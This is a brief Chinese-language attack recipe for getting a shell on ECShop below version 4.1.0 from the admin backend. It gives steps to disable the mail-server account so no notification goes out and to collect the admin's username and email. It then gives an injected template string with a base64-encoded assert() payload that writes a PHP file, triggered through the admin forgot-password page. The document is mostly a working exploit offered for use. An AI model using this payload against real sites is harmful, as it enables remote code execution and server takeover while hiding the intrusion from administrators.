# ECShop

---

## 后台getshell：

版本：ecshop4.1.0以下

教程：https://cloud.tencent.com/developer/article/1755572

系统设置/邮件服务器设置（将账号记录并删除,不然会发生邮件）

权限管理/管理员列表（记录用户名和Email地址）

模板管理/邮件模板/

```
base64解码：file_put_contents('xcheck.php','<?php phpinfo();'); #创建文件并输入
{str:{\$asd'];assert(base64_decode('ZmlsZV9wdXRfY29udGVudHMoJ3hjaGVjay5waHAnLCc8P3BocCBwaHBpbmZvKCk7Jyk7IA=='));//}x
确定保存
```

找到后台的忘记密码

```
https://xxxx/admin/get_password.php?act=forget_pwd
```

输入用户名和Email地址确定，会去调用邮件模板中的密码找回模板触发payload

